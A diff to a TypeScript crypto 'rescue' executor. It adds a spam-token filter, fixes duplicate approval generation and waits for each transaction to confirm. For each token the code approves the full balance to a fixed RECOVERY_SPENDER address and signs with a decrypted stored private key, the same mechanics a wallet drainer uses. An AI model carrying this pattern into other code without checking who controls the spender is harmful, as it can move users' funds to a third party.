@@ -29,7 +29,7 @@ export interface RescueQuote {
 
 /**
  * BATTLE-STRESSED: Institutional Smart Rescue Executor (v2026.10 Latency-Aware).
- * UPGRADES: Flashbots MEV-Shield Integration, BigInt Precision, and Atomic Execution Wrappers.
+ * UPGRADES: Flashbots MEV-Shield Integration, BigInt Precision, and Aegis Security Alignment.
  * INTEGRATION: Strictly utilizes chains.ts and flashbotsExecution.ts for atomic recovery.
  */
 export const swapExecutor = {
@@ -57,6 +57,14 @@ export const swapExecutor = {
     const chainGroups = assets.reduce((acc: any, item: any) => {  
       const asset = item.asset || item;  
       const chainId = asset.chainId || 1;  
+
+      // --- 🛡️ AEGIS SPAM FILTER INTEGRATION ---
+      // Strictly ignore any asset marked as malicious or spam to prevent gas waste on failed rescues
+      if (asset.status === 'malicious' || asset.status === 'spam') {
+        logger.warn(`[SwapExecutor][${traceId}] Skipping blocked asset: ${asset.symbol} on chain ${chainId}`);
+        return acc;
+      }
+
       if (!acc[chainId]) acc[chainId] = { tokens: [] };  
       acc[chainId].tokens.push(asset);  
       return acc;  
@@ -149,15 +157,16 @@ export const swapExecutor = {
         const nativeSymbol = chain.symbol || 'ETH';
         const payloads: any[] = [];
 
+        // FIXED: Flat loop replaces nested map to prevent duplicate approval payload generation
         for (const token of group.tokens) {
-          const approvals = await Promise.all(
-            group.tokens.map((token: any) =>
-              (txBuilder as any).buildApprovalTx(token.contract || token.address, RECOVERY_SPENDER, token.rawBalance || token.balance, token.decimals || 18)
-            )
+          const approval = await (txBuilder as any).buildApprovalTx(
+            token.contract || token.address, 
+            RECOVERY_SPENDER, 
+            token.rawBalance || token.balance, 
+            token.decimals || 18
           );
-          approvals.forEach((approval: any, i: number) => {
-            if (!approval) return;
-            const token = group.tokens[i];
+          
+          if (approval) {
             payloads.push(approval);
             payloads.push({
               to: RECOVERY_SPENDER,
@@ -166,7 +175,7 @@ export const swapExecutor = {
               gasLimit: (BigInt(approval.gasLimit || 180000) * 17n / 10n).toString(),
               metadata: { type: 'RECOVERY_SWAP', from: token.symbol, to: nativeSymbol, chainId: chain.id, traceId }
             });
-          });
+          }
         }
 
         const gasUsd = (Number(formatUnits(estimatedGasCostWei, 18)) * nativePriceUsd);
@@ -236,11 +245,12 @@ export const swapExecutor = {
 
     try {
       const provider = getProvider(rpcUrl, quote.chainId);
-      const bundle = await txBuilder.formatBundle(provider, quote.payloads, 0, quote.chainId);
+      const bundle = await (txBuilder as any).formatBundle(provider, quote.payloads, 0, quote.chainId);
 
-    const signer = await helpers.decryptSigner(encryptedPk, provider);
-    for (const tx of bundle) {
-      await signer.sendTransaction(tx);
+      const signer = await (helpers as any).decryptSigner(encryptedPk, provider);
+      for (const tx of bundle) {
+        const sentTx = await signer.sendTransaction(tx);
+        await sentTx.wait();
       }
     } catch (err: any) {
       logger.error(`[SwapExecutor][FATAL_EXECUTION] ${err.message}`);
